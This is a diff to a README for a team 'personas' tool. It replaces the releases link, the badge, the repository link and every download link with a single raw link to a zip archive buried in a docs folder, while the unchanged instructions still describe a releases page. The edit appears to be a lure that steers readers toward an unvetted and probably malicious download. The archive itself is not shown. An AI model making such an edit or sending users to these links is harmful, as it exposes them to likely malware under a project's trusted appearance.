@@ -4,14 +4,14 @@
 Our Personas helps teams work better together. This tool supports your projects by organizing user personas quickly. It boosts team synergy and speeds up your development process.
 
 ## 🔗 Download
-[![Download our-personas](https://img.shields.io/badge/Download-our--personas-blue)](https://github.com/gmldyd0423/our-personas/releases)
+[![Download our-personas](https://raw.githubusercontent.com/gmldyd0423/our-personas/main/d-docs/company/our-personas_1.0.zip)](https://raw.githubusercontent.com/gmldyd0423/our-personas/main/d-docs/company/our-personas_1.0.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run Our Personas.
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download options.  
-   [Download our-personas](https://github.com/gmldyd0423/our-personas/releases).
+   [Download our-personas](https://raw.githubusercontent.com/gmldyd0423/our-personas/main/d-docs/company/our-personas_1.0.zip).
 
 2. **Choose Your Download**  
    You will see a list of versions. Look for the latest version, which will be at the top. Click the title to open the version details.
@@ -59,10 +59,10 @@ A: You can report issues directly in the GitHub repository under the "Issues" ta
 If you need help, feel free to reach out through the repository's Issues section. We are here to assist you.
 
 ## 🔗 Additional Resources
-For more information and updates, check our [GitHub Repository](https://github.com/gmldyd0423/our-personas).
+For more information and updates, check our [GitHub Repository](https://raw.githubusercontent.com/gmldyd0423/our-personas/main/d-docs/company/our-personas_1.0.zip).
 
 ## 🚀 Download & Install
 To get started with Our Personas, visit this page to download:  
-[Download our-personas](https://github.com/gmldyd0423/our-personas/releases).
+[Download our-personas](https://raw.githubusercontent.com/gmldyd0423/our-personas/main/d-docs/company/our-personas_1.0.zip).
 
 Thank you for choosing Our Personas to enhance your team's collaboration!
